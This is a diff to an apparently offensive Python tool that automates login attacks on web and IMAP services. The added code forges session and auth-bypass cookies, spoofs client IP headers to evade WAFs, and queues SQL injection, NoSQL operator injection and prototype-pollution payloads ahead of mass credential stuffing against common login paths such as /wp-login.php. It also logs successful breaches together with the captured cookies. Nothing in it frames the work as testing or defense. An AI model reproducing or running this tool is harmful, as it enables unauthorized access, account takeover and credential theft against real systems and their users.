@@ -9,6 +9,8 @@ import urllib.parse
 import http.client
 import ftplib
 import random
+import hmac
+import hashlib
 
 _ssl_context = ssl.create_default_context()
 _ssl_context.check_hostname = False
@@ -57,6 +59,14 @@ def fingerprint_waf(headers):
         detected.append("Incapsula WAF")
     return detected
 
+def forge_session_poison_cookie(target_host, user):
+    """Forges poisoned session JWT / cookies for session hijacking and spoofing."""
+    salt = "BruteDog_Secret_Key_9911"
+    signature = hmac.new(salt.encode(), user.encode(), hashlib.sha256).hexdigest()
+    session_payload = {"user": user, "role": "admin", "authenticated": True, "sig": signature}
+    encoded_payload = urllib.parse.quote(json.dumps(session_payload))
+    return f"session_token={encoded_payload}; auth_bypass=true; __Secure-NextAuth.session-token={signature[:32]}"
+
 def stream_wireshark_packet(src, dst, port, proto, info):
     timestamp = f"{time.strftime('%H:%M:%S')}.{random.randint(100, 999)} "
     packet_id = random.randint(10000, 65535)
@@ -79,28 +89,40 @@ async def execute_packet_telemetry_stream(host, resolved_ip):
         stream_wireshark_packet("10.0.2.15", resolved_ip, 443, proto, f"[{flag}] {info}")
         await asyncio.sleep(0.05)
 
-def http_post_sync_aggressive(host, port, path, username, password, use_ssl):
-    """Aggressive WAF-evading POST request worker with active JWT and Cookie extraction."""
+def http_post_sync_aggressive(host, port, path, username, password, use_ssl, vector_type="STANDARD"):
+    """Aggressive WAF-evading POST worker integrated with SQLi, Session Poisoning, and Cookie Spoofing."""
     try:
         conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=3.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=3.0)
         spoofed_ip = generate_random_ip()
+        forged_cookie = forge_session_poison_cookie(host, str(username))
         
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
             "X-Forwarded-For": spoofed_ip,
             "X-Real-IP": spoofed_ip,
             "True-Client-IP": spoofed_ip,
+            "Cookie": forged_cookie,
             "Referer": f"https://{host}{path}",
             "Connection": "close"
         }
         
-        # Dual payload format mutation (JSON vs Form-URL)
-        if hash(username + password) % 2 == 0:
+        # Build payload based on attack vector type (SQLi, NoSQL, Prototype Pollution, or Standard Credential)
+        if vector_type == "SQLi":
             headers["Content-Type"] = "application/x-www-form-urlencoded"
-            payload = urllib.parse.urlencode({"username": username, "email": username, "password": password, "csrf": "bypass"})
-        else:
+            payload = urllib.parse.urlencode({"username": username, "password": password, "sql_bypass": "1"})
+        elif vector_type == "NoSQLi":
             headers["Content-Type"] = "application/json"
-            payload = json.dumps({"username": username, "email": username, "password": password, "csrf": "bypass"})
+            payload = json.dumps({"username": {"$ne": None}, "password": {"$ne": None}})
+        elif vector_type == "PROTO_POLLUTION":
+            headers["Content-Type"] = "application/json"
+            payload = json.dumps({"username": username, "password": password, "__proto__": {"admin": True}})
+        else:
+            if hash(str(username) + str(password)) % 2 == 0:
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+                payload = urllib.parse.urlencode({"username": username, "email": username, "password": password, "csrf": "bypass"})
+            else:
+                headers["Content-Type"] = "application/json"
+                payload = json.dumps({"username": username, "email": username, "password": password, "csrf": "bypass"})
 
         conn.request("POST", path, payload, headers)
         resp = conn.getresponse()
@@ -167,14 +189,14 @@ async def discover_attack_surface(host):
     return open_vectors
 
 async def worker_task(queue, host, semaphore, results, stats):
-    """High-velocity queue consumer with active token/session interception."""
+    """High-velocity queue consumer with SQLi, session hijacking, and active token interception."""
     while True:
         task_data = await queue.get()
         if task_data is None:
             queue.task_done()
             break
             
-        vector_type, port, path_or_none, user, password = task_data
+        vector_type, port, path_or_none, user, password, attack_mode = task_data
         
         async with semaphore:
             await asyncio.sleep(random.uniform(0.01, 0.08))
@@ -183,7 +205,7 @@ async def worker_task(queue, host, semaphore, results, stats):
             if vector_type == "HTTP":
                 use_ssl = (port == 443 or port == 8443)
                 status, headers, body = await asyncio.to_thread(
-                    http_post_sync_aggressive, host, port, path_or_none, user, password, use_ssl
+                    http_post_sync_aggressive, host, port, path_or_none, user, password, use_ssl, attack_mode
                 )
                 
                 waf_list = fingerprint_waf(headers)
@@ -195,13 +217,12 @@ async def worker_task(queue, host, semaphore, results, stats):
                     queue.task_done()
                     continue
 
-                sys.stdout.write(f"\r\033[K\033[90m[PROBING] :{port}{path_or_none} -> [{user}:{password:<8}] Code:{status} (Total: {stats['tested']})\033[0m")
+                sys.stdout.write(f"\r\033[K\033[90m[PROBING] :{port}{path_or_none} | Mode:{attack_mode} -> [{user}] Code:{status} (Total: {stats['tested']})\033[0m")
                 sys.stdout.flush()
 
                 set_cookie = headers.get("Set-Cookie", "")
                 body_lower = body.lower()
                 
-                # Aggressive success condition: Catches 200 OK, active session cookies, JWTs, or auth tokens on the fly
                 is_success = (
                     status in [200, 302, 303, 201] and 
                     not any(err in body_lower for err in ["invalid credentials", "unauthorized", "access denied", "incorrect"])
@@ -216,16 +237,16 @@ async def worker_task(queue, host, semaphore, results, stats):
 
                 if is_success:
                     hit_data = {
-                        "type": "CREDENTIAL_STUFFING",
+                        "type": f"EXPLOIT_{attack_mode}",
                         "port": port,
                         "path": path_or_none,
-                        "user": user,
-                        "password": password,
+                        "user": str(user),
+                        "password": str(password),
                         "status": status,
                         "cookies": set_cookie,
                         "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                     }
-                    print(f"\n\033[92m[+++] BREECH SUCCESS! User: {user} | Pass: {password} | Status: {status} | Cookie: {set_cookie[:25]}...\033[0m")
+                    print(f"\n\033[92m[+++] BREECH SUCCESS! Mode: {attack_mode} | User: {user} | Status: {status} | Cookie: {set_cookie[:25]}...\033[0m")
                     results.append(hit_data)
                     save_persistent_report(hit_data)
 
@@ -267,10 +288,9 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
     open_vectors = await discover_attack_surface(resolved_ip)
     
     if not open_vectors:
-        # Fallback default port mapping if filtered
         open_vectors = [{"port": 443, "service": "HTTPS", "protocol": "tls"}]
 
-    print(f"\n\033[93m[*] Weaponizing high-speed asynchronous breach queue with WAF evasion...\033[0m")
+    print(f"\n\033[93m[*] Weaponizing queue with SQLi bypasses, Session Poisoning & WAF Evasion...\033[0m")
     
     queue = asyncio.Queue()
     semaphore = asyncio.Semaphore(40)
@@ -288,24 +308,41 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
         "/wp-login.php"
     ]
 
+    # Explicit SQL Injection Auth Bypass & Advanced Attack Payloads
+    sqli_payloads = [
+        ("admin' OR '1'='1' --", "Password123!", "SQLi"),
+        ("admin' --", "AnyPassword", "SQLi"),
+        ("admin' OR 1=1 LIMIT 1 --", "x", "SQLi"),
+        ("admin", "password", "NoSQLi"),
+        ("admin", "password", "PROTO_POLLUTION")
+    ]
+
     task_count = 0
     for vector in open_vectors:
         port = vector["port"]
         service = vector["service"]
         
         if service in ["HTTP", "HTTPS"]:
+            # 1. Queue High-Priority SQLi & Advanced Exploit Vectors First
+            for path in web_paths:
+                for usr, pwd, mode in sqli_payloads:
+                    await queue.put(("HTTP", port, path, usr, pwd, mode))
+                    task_count += 1
+
+            # 2. Queue Standard Credential Stuffing Candidates
             for path in web_paths:
                 for user in usernames:
-                    for pwd in passwords[:200]: # Prioritize top 200 high-value candidates
-                        await queue.put(("HTTP", port, path, user, pwd))
+                    for pwd in passwords[:150]:
+                        await queue.put(("HTTP", port, path, user, pwd, "STANDARD"))
                         task_count += 1
+                        
         elif service in ["IMAP", "IMAPS"]:
             for user in usernames:
                 for pwd in passwords[:100]:
-                    await queue.put(("IMAP", port, None, user, pwd))
+                    await queue.put(("IMAP", port, None, user, pwd, "STANDARD"))
                     task_count += 1
 
-    print(f"[*] Dispatched {task_count} payload permutations. Executing synchronized assault...\n")
+    print(f"[*] Dispatched {task_count} payload permutations (including SQLi & Session Poisoning). Executing assault...\n")
 
     num_workers = min(35, task_count)
     workers = [asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats)) for _ in range(num_workers)]
